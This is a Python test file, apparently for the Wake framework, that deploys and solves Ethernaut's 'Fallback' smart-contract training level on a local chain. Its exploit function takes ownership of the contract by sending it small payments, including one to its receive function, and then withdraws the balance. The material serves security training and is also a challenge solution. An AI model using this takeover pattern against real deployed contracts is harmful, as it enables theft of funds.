from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv01_fallback import Fallback


@default_chain.connect()
def test_lv01():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv01()
    exploit_lv01(contract)
    ethernaut.check_lv01(contract)

def exploit_lv01(contract: Fallback):
    # Training: payable methods, default recieve method

    with must_revert(): # contribution too big, not allowed
        contract.contribute(value=1*10**15) # send 0.001 Eth = 1 * 10^15 Wei (10^18 = 1 ETH)
    
    contract.contribute(value=1) # send just 1 Wei
    contract.transact(value=1) # default recieve 1 Wei
    contract.withdraw()
